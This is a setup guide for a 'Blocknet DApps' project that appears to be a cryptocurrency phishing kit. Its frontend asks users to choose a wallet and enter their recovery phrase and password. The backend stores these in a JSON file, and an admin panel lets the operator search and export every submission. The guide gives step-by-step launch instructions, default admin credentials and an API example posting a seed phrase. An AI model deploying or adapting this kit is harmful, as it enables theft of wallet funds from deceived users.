# Quick Setup Guide

## 1️⃣ Extract the ZIP

```bash
unzip blocknet-dapps.zip
cd blocknet-dapps
```

## 2️⃣ Install Backend Dependencies

```bash
cd backend
npm install
```

## 3️⃣ Start the Backend Server

```bash
npm start
```

You should see:
```
╔════════════════════════════════════════════════════════╗
║           Blocknet DApps Backend Server                ║
╠════════════════════════════════════════════════════════╣
║  Environment: development
║  Port: 3000
╠════════════════════════════════════════════════════════╣
║  Public URLs:
║    • Frontend: http://localhost:5500
║    • API:      http://localhost:3000/api/
║
║  Admin Panel:
║    • Login:    http://localhost:3000/admin/login
║    • Dashboard: http://localhost:3000/admin/dashboard
║
║  Default Credentials:
║    • Username: admin
║    • Password: admin123
╚════════════════════════════════════════════════════════╝
```

## 4️⃣ Start the Frontend (in a new terminal)

```bash
cd frontend
python -m http.server 5500
```

Or using Node:
```bash
npx http-server -p 5500
```

Or using PHP:
```bash
php -S localhost:5500
```

## 5️⃣ Access the Application

### Frontend (User Interface)
- **URL**: http://localhost:5500
- **Features**: 
  - Wallet selection
  - Recovery phrase input
  - Password setup
  - Progress tracking

### Admin Panel
- **URL**: http://localhost:3000/admin/login
- **Username**: admin
- **Password**: admin123
- **Features**:
  - View all submissions
  - Search submissions
  - Update status and notes
  - Export data
  - Statistics dashboard

## 📝 Project Structure

```
blocknet-dapps/
├── frontend/                  # User-facing application
│   ├── index.html            # Main page with modal form
│   ├── styles.css            # Dark theme styling
│   └── script.js             # Form logic and API calls
│
├── backend/                   # Express.js server
│   ├── server.js             # Main application server
│   ├── package.json          # Dependencies
│   ├── public/               # Admin panel files
│   │   ├── admin-login.html
│   │   └── admin-dashboard.html
│   └── data/                 # Auto-created data directory
│       ├── submissions.json
│       └── users.json
│
└── SETUP.md                   # This file
```

## 🔑 Environment Variables (Optional)

Create `backend/.env`:
```env
PORT=3000
NODE_ENV=development
SESSION_SECRET=your-secret-key-here
```

## 🚀 API Endpoints

### Submit Form
```bash
POST http://localhost:3000/api/submit
Content-Type: application/json

{
  "wallet": "MetaMask",
  "recoveryPhrase": "word1 word2 ... word12",
  "password": "userpassword"
}
```

### Admin Login
```bash
POST http://localhost:3000/api/admin/login
Content-Type: application/json

{
  "username": "admin",
  "password": "admin123"
}
```

### Get Submissions
```bash
GET http://localhost:3000/api/admin/submissions
```

## ✅ Troubleshooting

### Port 3000 Already in Use
```bash
# Find process using port 3000
lsof -i :3000
# Kill the process
kill -9 <PID>
```

### Port 5500 Already in Use
```bash
# Use a different port
python -m http.server 5501
# Then visit http://localhost:5501
```

### CORS Errors
- Ensure backend is running on port 3000
- Try clearing browser cache (Ctrl+Shift+Delete)

### Data Not Persisting
- Check that `backend/data` directory exists
- Verify file permissions: `chmod 755 backend/data`

### Admin Login Not Working
- Verify backend is running
- Check console for errors
- Try default credentials again: admin / admin123

## 📦 Dependencies

### Backend
- express: ^4.18.2
- cors: ^2.8.5
- bcryptjs: ^2.4.3
- express-session: ^1.17.3
- body-parser: ^1.20.2
- uuid: ^9.0.0

### Frontend
- None (vanilla JavaScript + HTML/CSS)

## 🔐 Security Notes

⚠️ **For Production Use:**

1. **Change Admin Credentials**
   - Edit `backend/data/users.json` or implement a secure password reset

2. **Use HTTPS**
   - Deploy with SSL/TLS certificates

3. **Set Strong Session Secret**
   - Update `SESSION_SECRET` in `.env`

4. **Configure CORS**
   - Update allowed origins in `server.js`

5. **Enable Data Encryption**
   - Implement database encryption

6. **Setup Backups**
   - Regularly backup `backend/data` directory

## 📚 Further Reading

- See `README.md` for full documentation
- See `backend/server.js` for API implementation details
- See `frontend/script.js` for client-side logic

## 🆘 Support

- Check error messages in browser console (F12)
- Check backend server logs
- Verify all ports are correct
- Ensure Node.js and npm are installed correctly

## Happy Coding! 🎉
